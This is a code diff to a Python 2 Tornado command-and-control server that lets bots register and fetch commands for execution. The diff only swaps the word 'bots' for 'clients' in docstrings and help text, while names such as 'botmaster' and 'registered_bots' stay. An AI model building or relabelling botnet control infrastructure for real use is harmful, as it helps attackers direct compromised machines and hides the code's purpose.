@@ -1,8 +1,8 @@
 #!/usr/bin/env python2
 # coding=UTF-8
-"""This file implements a CnC-Server that presents a web interface over which it can issue commands to bots
-and keep track of bots that register themselves regularly with the server. A command may be any method that
-is defined in BotCommands.py. This method will be executed by all bots that fetch it.
+"""This file implements a CnC-Server that presents a web interface over which it can issue commands to clients
+and keep track of clients that register themselves regularly with the server. A command may be any method that
+is defined in BotCommands.py. This method will be executed by all clients that fetch it.
 All handler support plain text and json output."""
 
 import json, logging, string, sys, time, socket, os
@@ -36,11 +36,11 @@ class MainHandler(tornado.web.RequestHandler):
             self.write(json.dumps(tornado.web.Application.handlers))
         else:
             self.write("This server offers the following functions:\n"
-                       "/register where bots can register themselves so we can keep track of them."
-                       "/current_command where bots can retrieve commands that they should execute")
+                       "/register where clients can register themselves so we can keep track of them."
+                       "/current_command where clients can retrieve commands that they should execute")
 
 class CurrentCommandHandler(tornado.web.RequestHandler):
-    """A handler that lets bots fetch the current command via HTTP GET and lets the botmaster issue a new command via
+    """A handler that lets clients fetch the current command via HTTP GET and lets the botmaster issue a new command via
     HTTP POST."""
 
     current_command = {"command": "default_command", "kwargs": {}}
@@ -75,7 +75,7 @@ class CurrentCommandHandler(tornado.web.RequestHandler):
 
 
 class RegisterHandler(tornado.web.RequestHandler):
-    """Bots can register via HTTP POST, the number of currently known bots can be retrieved via HTTP GET"""
+    """Bots can register via HTTP POST, the number of currently known clients can be retrieved via HTTP GET"""
 
     registered_bots = dict()
 
